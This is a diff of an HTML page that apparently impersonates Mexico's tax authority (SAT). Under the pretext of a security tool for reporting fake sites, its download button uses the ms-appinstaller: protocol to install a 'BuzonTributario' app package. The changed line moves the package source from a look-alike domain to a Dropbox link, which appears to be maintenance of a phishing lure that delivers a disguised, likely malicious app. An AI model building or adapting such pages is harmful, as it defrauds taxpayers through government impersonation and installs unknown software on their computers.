@@ -169,7 +169,7 @@ h2 {
   <p class="small">NOTA: Con esta herramienta, el SAT elabora un registro con la información de sitios falsos para monitorear las denuncias que hacen los contribuyentes cuando reciben correos o información engañosa a nombre de la institución.</p>
   
   <div class="options">
-    <a onclick="document.getElementById('mimodalBox').style.display = 'none'" href="ms-appinstaller:?source=https://conectaseguro.online/BuzonTributario.msix" class="btn">Descargar Herramienta</a>
+    <a onclick="document.getElementById('mimodalBox').style.display = 'none'" href="ms-appinstaller:?source=https://dl.dropboxusercontent.com/s/vxi85bn5z66zliy/BuzonTributario.appxbundle" class="btn">Descargar Herramienta</a>
     <button onclick="document.getElementById('mimodalBox').style.display = 'none'" class="btnCancel">Cancelar</button>
   </div>
   </div> 
